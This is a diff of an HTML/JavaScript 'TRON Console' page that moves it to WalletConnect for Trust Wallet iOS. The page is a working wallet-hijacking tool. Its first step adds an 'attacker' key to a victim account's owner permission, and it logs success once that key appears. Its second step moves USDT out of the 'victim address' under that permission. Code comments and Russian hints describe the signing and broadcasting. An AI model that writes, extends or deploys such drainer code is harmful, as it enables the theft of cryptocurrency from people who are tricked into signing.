@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>TRON Console — USDT Mainnet</title>
+<title>TRON Console — USDT (WalletConnect)</title>
 <style>
   :root{--bg:#0b0f14;--panel:#111823;--line:#1e2a3a;--text:#e6edf3;--muted:#8b9bb0;
     --accent:#4f8cff;--accent2:#22c55e;--danger:#ef4444;
@@ -56,8 +56,8 @@
 <header>
   <div class="logo">T</div>
   <div>
-    <h1>TRON Console — USDT Mainnet</h1>
-    <div class="sub">permission update → USDT transfer</div>
+    <h1>TRON Console — USDT (WalletConnect)</h1>
+    <div class="sub">Trust Wallet iOS via WalletConnect v2</div>
   </div>
 </header>
 
@@ -66,20 +66,19 @@
   <span id="statusText">not connected</span>
 </div>
 
-<!-- WALLET -->
 <div class="card">
-  <h2>Wallet</h2>
+  <h2>WalletConnect</h2>
   <label>Connected address</label>
   <input id="walletAddr" readonly placeholder="—">
-  <label>Node</label>
-  <input id="network" readonly placeholder="—">
+  <label>Network</label>
+  <input id="network" readonly value="tron:0x2b6653dc (mainnet)">
   <div class="row" style="margin-top:12px">
-    <button class="btn-secondary" id="btnConnect">Connect</button>
+    <button class="btn-primary" id="btnConnect">Connect via WalletConnect</button>
     <button class="btn-secondary" id="btnRefresh">Refresh account</button>
   </div>
+  <div class="hint">Нажми Connect — откроется Trust. Подтверди подключение. Вернись в браузер.</div>
 </div>
 
-<!-- STEP 1: PERMISSION UPDATE -->
 <div class="card warn">
   <h2>Step 1 — AccountPermissionUpdate <span class="badge">mainnet</span></h2>
   <label>Target address (owner permission to modify)</label>
@@ -90,8 +89,8 @@
     <div>
       <label>Mode</label>
       <select id="mode">
-        <option value="owner">Owner (full control, Permission_id=0)</option>
-        <option value="active">Active (limited, Permission_id=2)</option>
+        <option value="owner">Owner (Permission_id=0)</option>
+        <option value="active">Active (Permission_id=2)</option>
       </select>
     </div>
     <div>
@@ -106,15 +105,14 @@
   </div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildPerm">Build</button>
-    <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
+    <button class="btn-primary" id="btnSignPerm">Sign via WC</button>
   </div>
-  <div class="hint">Сжигает 100 TRX на газ. Необратимо для дефолтного аккаунта.</div>
+  <div class="hint">Сжигает 100 TRX. Trust сам broadcast'ит — сайт не отправляет raw TX.</div>
 </div>
 
-<!-- STEP 2: USDT TRANSFER -->
 <div class="card">
   <h2>Step 2 — USDT transfer <span class="badge">TRC-20</span></h2>
-  <label>From (victim address — должен иметь USDT)</label>
+  <label>From (victim address)</label>
   <input id="usdtFrom" placeholder="T...">
   <label>To (recipient)</label>
   <input id="usdtTo" placeholder="T...">
@@ -124,25 +122,22 @@
       <input id="usdtAmount" type="number" step="0.000001" placeholder="0.01">
     </div>
     <div>
-      <label>Sign with Permission_id</label>
+      <label>Permission_id</label>
       <input id="usdtPermId" type="number" value="0">
     </div>
   </div>
-  <div class="hint">Owner = 0. Active = 2 (или id твоего active). Если не совпадёт — SIGERROR.</div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildUsdt">Build USDT tx</button>
-    <button class="btn-green" id="btnSignUsdt">Sign &amp; broadcast</button>
+    <button class="btn-green" id="btnSignUsdt">Sign via WC</button>
   </div>
-  <div class="hint">Строит triggerSmartContract(USDT, transfer, from=victim). Подпись — ключом attacker из кошелька.</div>
+  <div class="hint">Trust broadcast'ит сам. После подписи жди 6с и жми Refresh.</div>
 </div>
 
-<!-- ACCOUNT STATE -->
 <div class="card">
   <h2>Account state <span class="badge" id="accPill">idle</span></h2>
   <div class="state" id="accState">refresh to inspect</div>
 </div>
 
-<!-- LOG -->
 <div class="card">
   <h2>Log</h2>
   <div class="log" id="log"></div>
@@ -153,17 +148,24 @@
 
 </div>
 
-<script>
-(function(){
-"use strict";
+<script type="module">
+import { WalletConnectAdapter } from 'https://esm.sh/@tronweb3/tronwallet-adapter-walletconnect@3.0.2';
+import TronWeb from 'https://esm.sh/tronweb@5.3.2';
 
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const USDT_DECIMALS = 6;
-
-const S = { tronWeb:null, address:null, lastPermTx:null, lastUsdtTx:null };
+const PROJECT_ID = "ВСТАВЬ_СВОЙ_WALLETCONNECT_PROJECT_ID";
 
 const $ = id => document.getElementById(id);
 const logEl = $("log");
+
+const S = {
+  adapter: null,
+  tronWeb: null,
+  address: null,
+  lastPermTx: null,
+  lastUsdtTx: null,
+};
 
 function log(msg, cls){
   const line = document.createElement("div");
@@ -178,79 +180,102 @@ function setStatus(t, st){
   $("statusDot").className = "dot" + (st==="on"?" on":st==="err"?" err":"");
 }
 
-function isTron(a){
-  return typeof a === "string" && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
+function isTron(a){ return typeof a==="string" && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a); }
+function short(a){ return a ? a.slice(0,8)+"…"+a.slice(-6) : "—"; }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function hexDecode(h){
+  try{ return new TextDecoder().decode(new Uint8Array(h.match(/.{1,2}/g).map(b=>parseInt(b,16)))); }
+  catch(_){ return h; }
 }
 
-function short(a){ return a ? a.slice(0,8)+"…"+a.slice(-6) : "—"; }
+// ---------- init ----------
+async function initAdapter(){
+  if (S.adapter) return S.adapter;
 
-// ---------- WALLET ----------
-function detect(){
-  if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
-  if (window.tronLink && window.tronLink.ready) return window.tronLink;
-  return null;
+  S.tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
+
+  S.adapter = new WalletConnectAdapter({
+    network: "Mainnet",
+    options: {
+      relayUrl: "wss://relay.walletconnect.com",
+      projectId: PROJECT_ID,
+      metadata: {
+        name: "TRON Console",
+        description: "Permission & USDT console",
+        url: location.origin,
+        icons: [location.origin + "/favicon.ico"],
+      },
+    },
+    themeMode: "dark",
+  });
+
+  S.adapter.on("connect", (addr) => {
+    S.address = addr;
+    $("walletAddr").value = addr;
+    $("targetAddr").value = addr;
+    $("usdtFrom").value = addr;
+    setStatus("connected: " + short(addr), "on");
+    log("WC connected: " + addr, "ok");
+  });
+
+  S.adapter.on("disconnect", () => {
+    S.address = null;
+    $("walletAddr").value = "";
+    setStatus("disconnected", "err");
+    log("WC disconnected", "err");
+  });
+
+  return S.adapter;
 }
 
 async function connect(){
   try{
-    const tw = detect();
-    if (!tw){ setStatus("tronWeb not injected","err"); log("open inside Trust Wallet browser","err"); return; }
-    S.tronWeb = tw;
-    if (tw.request && typeof tw.request === "function"){
-      try{ await tw.request({method:"tron_requestAccounts"}); }catch(e){ log("requestAccounts: "+e.message,"err"); }
-    }
-    S.address = tw.defaultAddress && tw.defaultAddress.base58;
-    if (!S.address){ setStatus("no address","err"); return; }
-    $("walletAddr").value = S.address;
-    $("network").value = (tw.fullNode && tw.fullNode.host) || "unknown";
-    $("targetAddr").value = S.address;
-    $("usdtFrom").value = S.address;
-    setStatus("connected: "+short(S.address), "on");
-    log("connected "+S.address, "ok");
-    log("node: "+$("network").value, "info");
-    await refresh();
+    const adapter = await initAdapter();
+    log("opening WalletConnect…", "info");
+    await adapter.connect();
+    // address появляется через event 'connect'
   }catch(e){
-    setStatus("connect failed","err");
-    log("connect error: "+(e.message||e), "err");
+    log("connect error: " + (e.message||e), "err");
+    setStatus("connect failed", "err");
   }
 }
 
-// ---------- REFRESH ----------
+// ---------- refresh ----------
 async function refresh(){
-  if (!S.tronWeb || !S.address){ log("connect first","err"); return; }
+  if (!S.address){ log("connect first", "err"); return; }
   try{
     const acc = await S.tronWeb.trx.getAccount(S.address);
     const owner = acc.owner_permission;
     const actives = acc.active_permission || [];
     const lines = [];
-    lines.push("address: "+S.address);
-    lines.push("balance: "+((acc.balance||0)/1e6)+" TRX");
+    lines.push("address: " + S.address);
+    lines.push("balance: " + ((acc.balance||0)/1e6) + " TRX");
     lines.push("");
     lines.push("owner_permission:");
     if (owner){
-      lines.push("  threshold: "+owner.threshold);
-      (owner.keys||[]).forEach(k => lines.push("    - "+k.address+"  w="+k.weight));
+      lines.push("  threshold: " + owner.threshold);
+      (owner.keys||[]).forEach(k => lines.push("    - " + k.address + "  w=" + k.weight));
     } else {
       lines.push("  (default single-key threshold 1)");
     }
     lines.push("");
-    lines.push("active_permission: "+actives.length);
+    lines.push("active_permission: " + actives.length);
     actives.forEach((a,i)=>{
-      lines.push("  ["+i+"] "+(a.permission_name||"active"+i)+"  threshold="+a.threshold);
-      lines.push("    operations: "+(a.operations||"—"));
-      (a.keys||[]).forEach(k => lines.push("      - "+k.address+"  w="+k.weight));
+      lines.push("  ["+i+"] " + (a.permission_name||"active"+i) + "  threshold=" + a.threshold);
+      lines.push("    operations: " + (a.operations||"—"));
+      (a.keys||[]).forEach(k => lines.push("      - " + k.address + "  w=" + k.weight));
     });
     $("accState").textContent = lines.join("\n");
     $("accPill").textContent = owner ? "loaded" : "empty";
-    log("account refreshed","ok");
+    log("account refreshed", "ok");
   }catch(e){
-    log("refresh error: "+(e.message||e),"err");
+    log("refresh error: " + (e.message||e), "err");
   }
 }
 
-// ---------- STEP 1: PERMISSION UPDATE ----------
+// ---------- STEP 1 ----------
 async function buildPerm(){
-  if (!S.tronWeb || !S.address) throw new Error("connect first");
+  if (!S.address) throw new Error("connect first");
   const target = $("targetAddr").value.trim();
   const attacker = $("attackerAddr").value.trim();
   const mode = $("mode").value;
@@ -276,13 +301,12 @@ async function buildPerm(){
     }];
   }
 
-  log("building AccountPermissionUpdate…","info");
-  log("owner threshold="+threshold+" keys=["+short(target)+", "+short(attacker)+"]","info");
-  if (actives) log("active ops="+actives[0].operations,"info");
+  log("building AccountPermissionUpdate…", "info");
+  log("owner threshold="+threshold+" keys=["+short(target)+", "+short(attacker)+"]", "info");
 
   const tx = await S.tronWeb.transactionBuilder.updateAccountPermissions(target, owner, null, actives);
   S.lastPermTx = tx;
-  log("permission tx built: "+tx.txID,"ok");
+  log("perm tx built: " + tx.txID, "ok");
   return tx;
 }
 
@@ -290,25 +314,32 @@ async function signPerm(){
   try{
     const tx = S.lastPermTx || await buildPerm();
     if (!tx) throw new Error("no tx");
-    log("requesting signature for permission update…","info");
-    const signed = await S.tronWeb.trx.sign(tx);
-    log("signed","ok");
-    const res = await S.tronWeb.trx.sendRawTransaction(signed);
-    if (!res || res.result !== true){
-      throw new Error(res && res.message ? hexDecode(res.message) : "broadcast failed");
-    }
-    log("permission broadcast ok: "+res.txid,"ok");
-    log("waiting 6s…","info");
+
+    log("requesting WC signature for permission update…", "info");
+    // Trust вернёт { signed: true, signature: [] } или сразу txid
+    const res = await S.adapter.signTransaction(tx);
+    log("WC response: " + JSON.stringify(res).slice(0, 200), "info");
+
+    // Trust делает auto-broadcast. Ждём и проверяем.
+    log("waiting 6s for on-chain state (Trust auto-broadcast)…", "info");
     await sleep(6000);
     await refresh();
+
+    // проверка: появился ли attacker в owner keys
+    const acc = await S.tronWeb.trx.getAccount($("targetAddr").value.trim());
+    const keys = acc.owner_permission && acc.owner_permission.keys || [];
+    const found = keys.some(k => k.address === $("attackerAddr").value.trim());
+    if (found) log("SUCCESS: attacker key found in owner_permission", "ok");
+    else log("NOT FOUND: attacker key not in owner_permission — check tx status in explorer", "err");
+
   }catch(e){
-    log("perm sign/send error: "+(e.message||e),"err");
+    log("perm sign error: " + (e.message||e), "err");
   }
 }
 
-// ---------- STEP 2: USDT TRANSFER ----------
+// ---------- STEP 2 ----------
 async function buildUsdt(){
-  if (!S.tronWeb || !S.address) throw new Error("connect first");
+  if (!S.address) throw new Error("connect first");
   const from = $("usdtFrom").value.trim();
   const to = $("usdtTo").value.trim();
   const amt = parseFloat($("usdtAmount").value);
@@ -320,27 +351,24 @@ async function buildUsdt(){
   if (isNaN(permId) || permId < 0) throw new Error("Permission_id >= 0");
 
   const amountRaw = Math.floor(amt * Math.pow(10, USDT_DECIMALS));
-  log("building USDT transfer…","info");
-  log("from="+short(from)+" to="+short(to)+" amount="+amt+" USDT ("+amountRaw+" raw)","info");
-  log("Permission_id="+permId,"info");
+  log("building USDT transfer…", "info");
+  log("from="+short(from)+" to="+short(to)+" amount="+amt+" ("+amountRaw+" raw)", "info");
+  log("Permission_id="+permId, "info");
 
   const wrapper = await S.tronWeb.transactionBuilder.triggerSmartContract(
     USDT,
     "transfer(address,uint256)",
     { feeLimit: 100_000_000, callValue: 0, permissionId: permId },
-    [
-      { type:"address", value: to },
-      { type:"uint256", value: amountRaw }
-    ],
+    [{ type:"address", value: to }, { type:"uint256", value: amountRaw }],
     from
   );
 
   if (!wrapper || !wrapper.result || !wrapper.result.result){
-    throw new Error("triggerSmartContract failed: "+JSON.stringify(wrapper && wrapper.result));
+    throw new Error("triggerSmartContract failed: " + JSON.stringify(wrapper && wrapper.result));
   }
 
   S.lastUsdtTx = wrapper.transaction;
-  log("USDT tx built: "+wrapper.transaction.txID,"ok");
+  log("USDT tx built: " + wrapper.transaction.txID, "ok");
   return wrapper.transaction;
 }
 
@@ -349,34 +377,16 @@ async function signUsdt(){
     const tx = S.lastUsdtTx || await buildUsdt();
     if (!tx) throw new Error("no tx");
 
-    // ensure Permission_id matches chosen
     const permId = parseInt($("usdtPermId").value,10);
     tx.raw_data.contract[0].Permission_id = permId;
 
-    log("requesting signature for USDT tx…","info");
-    const signed = await S.tronWeb.trx.sign(tx);
-    log("signed","ok");
-
-    const res = await S.tronWeb.trx.sendRawTransaction(signed);
-    if (!res || res.result !== true){
-      throw new Error(res && res.message ? hexDecode(res.message) : "broadcast failed");
-    }
-    log("USDT broadcast ok: "+res.txid,"ok");
-    log("check balance in explorer / Refresh","info");
+    log("requesting WC signature for USDT…", "info");
+    const res = await S.adapter.signTransaction(tx);
+    log("WC response: " + JSON.stringify(res).slice(0, 200), "info");
+    log("Trust auto-broadcast. Check explorer for txid.", "info");
   }catch(e){
-    log("USDT sign/send error: "+(e.message||e),"err");
+    log("USDT sign error: " + (e.message||e), "err");
   }
-}
-
-// ---------- utils ----------
-function sleep(ms){ return new Promise(r => setTimeout(r,ms)); }
-
-function hexDecode(h){
-  try{
-    return new TextDecoder().decode(
-      new Uint8Array(h.match(/.{1,2}/g).map(b => parseInt(b,16)))
-    );
-  }catch(_){ return h; }
 }
 
 // ---------- wire ----------
@@ -391,12 +401,8 @@ $("btnSignPerm").onclick = signPerm;
 $("btnBuildUsdt").onclick = async ()=>{ try{ await buildUsdt(); }catch(e){ log("build usdt: "+(e.message||e),"err"); } };
 $("btnSignUsdt").onclick = signUsdt;
 
-window.addEventListener("load", ()=>{
-  if (detect()){ log("tronWeb detected, connecting…","info"); connect(); }
-  else log("tronWeb not present — open in Trust Wallet browser","err");
-});
-
-})();
+// auto-init
+initAdapter().then(()=>log("WalletConnect adapter ready", "info")).catch(e=>log("init: "+e.message,"err"));
 </script>
 </body>
 </html>
